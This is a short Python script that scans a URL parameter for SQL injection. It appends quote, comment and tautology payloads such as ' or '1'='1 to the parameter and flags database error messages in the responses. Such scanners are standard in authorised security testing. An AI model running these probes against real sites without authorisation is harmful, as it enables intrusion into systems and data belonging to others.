import re
import urllib.parse
import urllib.request

ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning: mysql", re.I),
    re.compile(r"unclosed quotation mark after the character string", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
]


PAYLOADS = ["'", '"', "'--", '"--', "' or '1'='1", '" or "1"="1']


def test_parameter(url, param, value):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    original = query.get(param, [''])[0]
    results = []
    for payload in PAYLOADS:
        query[param] = original + payload
        new_query = urllib.parse.urlencode(query, doseq=True)
        new_url = urllib.parse.urlunparse(
            parsed._replace(query=new_query)
        )
        try:
            with urllib.request.urlopen(new_url) as resp:
                body = resp.read().decode('utf-8', errors='replace')
        except Exception as e:
            body = str(e)
        vulnerable = any(p.search(body) for p in ERROR_PATTERNS)
        results.append({
            'url': new_url,
            'param': param,
            'payload': payload,
            'vulnerable': vulnerable,
        })
    return results
